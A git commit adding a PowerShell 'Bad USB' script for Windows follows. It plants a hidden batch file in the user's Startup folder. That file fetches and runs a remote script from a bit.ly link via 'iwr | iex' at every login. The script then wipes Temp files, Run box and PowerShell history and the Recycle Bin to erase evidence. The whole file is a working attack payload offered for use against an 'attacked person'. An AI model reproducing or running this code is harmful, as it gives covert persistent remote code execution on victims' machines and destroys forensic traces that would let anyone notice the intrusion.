e992cb64104a219e4d89dd16aa7907d1cb4daf05
ItsChuckLex <121667748+ItsChuckLex@users.noreply.github.com>
2022-12-30 22:30:03 +0100

    Add files via upload

---
+++ Autostart/autostart.ps1
@@ -0,0 +1,75 @@
+﻿##########################################################################################################################################################
+#                                    #  ⠀
+#                                    #  ⠀⣀⣶⣿⣿⣿⣿⣶⣆⡀⠀⠀⠀ ⣶⣶⣶⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⣶⣶⣶⣶⡶⠀⠀⠀⠀⠀⠀⠀ ⣶⣶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#                                    # ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+#   Titel: Autostart                 # ⣸⣿⣿⣿⣿⠃⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣯⣴⣾⣿⣷⣶⡄⠀⢰⣶⣶⣶⣶⡆⠀⣶⣶⣶⣶⣶⠀⠀⢀⣠⣶⣾⣿⣿⣶⣶⣄⠀⠀⠀⣿⣿⣿⣿⣇⠀⣶⣶⣶⣶⠃⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣠⣴⣶⣿⣿⣷⣶⣦⡀⠀⠀⣷⣶⣶⣶⠀⢀⣶⣶⣶⣶⠂
+#   Decribtion: Start files by Login # ⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⠛⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢀⣾⣿⣿⣿⡟⠻⣿⣿⣿⣷⠀⠀⣿⣿⣿⣿⣷⣼⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣸⣿⣿⣿⣿⠛⣿⣿⣿⣿⣆⠀⢸⣿⣿⣿⡆⢸⣿⣿⣿⡟⠀
+#   Author: ChuckLex                 # ⣿⣿⣿⣿⣿⠀⠀⠿⠿⠿⠿⠿⠃⠀⣿⣿⣿⣿⡇⠀⣽⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⡗⠀⣿⣿⣿⣿⣿⠀⠀⢿⣿⣿⣷⣾⣿⣿⣿⠁⠀
+#   Version: 1.0                     # ⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠉⠉⠉⠉⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡏⠀⠀
+#   Category: Bad Usb                # ⣿⣿⣿⣿⣿⠀⠀⣤⣤⣤⣤⣤⠄⠀⣿⣿⣿⣿⡇⠀⢼⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⠛⠛⠛⠛⠛⠛⠀⠀⢀⣿⣿⣿⣿⣿⣿⡇⠀⠀
+#   Target: Windows                  # ⢿⣿⣿⣿⣿⠄⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⡇⠀⢺⣿⣿⣿⣿⠀⢰⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣶⣶⣶⣶⡆⠀⣿⣿⣿⣿⡿⣿⣿⣿⣿⡆⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⡯⠀⢸⣿⣿⣿⣿⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡀⠀
+#   Mode: HID                        #⠀⢻⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⡇⠀⣻⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀⠸⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⠃⠀⣿⣿⣿⣿⡇⢹⣿⣿⣿⣷⠀⠀⣿⣿⣿⣿⣿⣤⣤⣤⠀⣿⣿⣿⣿⣷⠀⢸⣿⣿⣿⣿⠀⢠⣿⣿⣿⡏⢻⣿⣿⣿⣇⠀
+#                                    #⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⣿⣿⣿⣿⣇⠀⣽⣿⣿⣿⣿⠀⠀⢿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⠀⠀⠻⣿⣿⣿⣿⣾⣿⣿⣿⠏⠀⠀⣿⣿⣿⣿⡇⠈⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠘⢿⣿⣿⣿⣷⣿⣿⣿⡿⠃⠀⣼⣿⣿⣿⠃⠸⣿⣿⣿⣿⡄
+#                                    #⠀  ⠈⠹⠿⠿⠿⠿⠿⠉⠀⠀⠀⠀ ⠿⠿⠿⠿⠏⠀⠹⠿⠿⠿⠿⠀⠀⠈⠹⠿⠿⠏⠁⠿⠿⠿⠿⠿⠀⠀⠀⠈⠹⠿⠿⠿⠿⠏⠁⠀⠀⠀⠿⠿⠿⠿⠏⠀⠹⠿⠿⠿⠿⠀ ⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠉⠿⠿⠿⠿⠿⠉⠀⠀⠀⠿⠿⠿⠿⠀⠀⠿⠿⠿⠿⠇
+#                                    #⠀⠀⠀  ⠀⠀⠀      
+###########################################################################################################################################################
+#----------------------------------------------------------------------------------------------------
+
+<#
+.NOTES 
+	This script will write a .bat, which will execute a .ps1 if the attacked person loged in
+    Bitly-Link: 
+#>
+
+#----------------------------------------------------------------------------------------------------
+
+#Variables
+$ps1_path = "W:\Bad_Usb\Sound\sound.ps1" # Absolut/Local path
+$git_path = "bit.ly/3GssBtb" # Github path
+$bat_file_name = "\StartIt.bat"
+$autostart_path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + $bat_file_name
+
+#Chose between one of them and comment the other:
+
+#This Batch file is used for a local .ps1
+#$batchContent ="@echo off
+#PowerShell.exe -WindowStyle hidden -NoProfile -ExecutionPolicy ByPass -File $ps1_path
+#pause
+#"
+
+#This Batch file is used for a .ps1 from Github
+$batchContent ='@echo off
+PowerShell.exe -WindowStyle hidden -NoProfile -ExecutionPolicy ByPass -Command "&{iwr '+ $git_path +' | iex}"
+pause
+'
+
+# Create Batch file and save it in Autostart folder
+$batchContent | Out-File -FilePath $autostart_path -Encoding ASCII
+# Run the Batch file directly the first time
+start $autostart_path
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+    Bitly-Link: bit.ly/3WW26Sf
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+#----------------------------------------------------------------------------------------------------
